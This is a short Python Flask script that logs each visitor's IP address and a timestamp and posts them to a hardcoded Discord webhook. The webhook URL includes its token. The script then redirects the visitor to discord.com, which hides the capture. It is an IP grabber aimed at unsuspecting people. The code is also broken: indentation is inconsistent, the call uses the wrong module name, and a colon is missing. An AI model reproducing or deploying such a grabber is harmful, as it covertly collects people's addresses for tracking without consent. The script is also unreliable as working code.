from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1335096060489633872/ML2OE6VWoigEC6gbgW_s-lqGg22hyd7ShK9HS6X6BtJblzc7G6ahL7utMtJbbTgv-zJm"
    data = {
        "content" : "",
        "title" : "Kupal"
   }
    data["embeds"] = [
        {
            "title" : ip,
            "description": date
        }
   ]
   request.post(webhook_url, json=data)

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
    
    send_ip(ip, date)
    
    return redirect("https://discord.com")
    
    
    
if __name__ == "__main__"
    app.run(host='0.0.0.0')
